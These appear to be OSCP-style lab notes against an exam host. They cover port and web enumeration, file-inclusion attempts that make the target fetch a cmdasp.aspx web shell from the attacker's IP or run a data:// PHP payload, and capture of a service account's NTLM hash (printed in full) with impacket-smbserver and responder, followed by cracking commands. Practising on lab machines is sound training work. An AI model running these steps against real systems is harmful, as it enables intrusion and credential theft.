```
nmap 192.168.194.147 192.168.194.149-151
```

.147
```
nmap -sT -A MS01.oscp.exam
whatweb MS01.oscp.exam:8080
whatweb MS01.oscp.exam:8000

# due to the proxy, we cannot do anything with the IP:8080 (400 error), so get the DNS name from the output of nmap (8443 port shows cert dns name) and create a hostfile entry for it
gobuster dir -u http://MS01.oscp.exam:8000 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --url http://MS01.oscp.exam:8080/home --filter-status=200

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://MS01.oscp.exam/mvc/FUZZ

nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.194.147

enum4linux -n 192.168.194.147

nmap --script=smb-enum* --script-args=unsafe=1 -T5 192.168.194.147
smbclient -p 5040 -L 192.168.194.147

nmap 192.168.194.147 --script=msrpc-enum

nbtstat -a 192.168.194.147

# we find that the url param seems to be vulerable to some sort of file inclusion vuln - cannot get shells from them though
curl -X POST --data 'name=test&mail=test@test.com&url=http://192.168.45.219/cmdasp.aspx' http://MS01.oscp.exam:8080/home/signup

curl -X POST --data "name=test&mail=test@test.com&url=data://text/plain,<?php%20echo%20system('ls');?>" http://MS01.oscp.exam:8080/home/signup


# NOTE: this is an option if you see a url or similar input field
# capture hashes for authenticating by inputting \\192.168.45.219\smb\test.txt into the url field of the form. Then submit the form and watch requests come through with the NTLM hash
sudo impacket-smbserver -smb2support smb smb

obtain
web_svc::OSCP:aaaaaaaaaaaaaaaa:3199a5b6dcd4372f1b0723d818b89db8:0101000000000000005829608328da014631744e9608a28b000000000100100049007000650050004100460047006400030010004900700065005000410046004700640002001000680074006c0068006f0052006c00570004001000680074006c0068006f0052006c00570007000800005829608328da0106000400020000000800300030000000000000000000000000300000aca6e088ddb6bd5237f6e791173af27069540d515a100b21569a5cf7198c0cd80a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310039000000000000000000
90CCE81CD3110E1140B4ABDC12271F25
# can also use responder for this - HAS TO LISTEN on VPN interface
# responds to smb requests (be in smb dir)
sudo responder -I tun0

# try cracking with john
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules-=/usr/share/john/rules/rockyou-30000.rule web_svc.hash
hashcat -m 1000 web_svc.hash /usr/share/wordlists/rockyou.txt -r rules --force
```
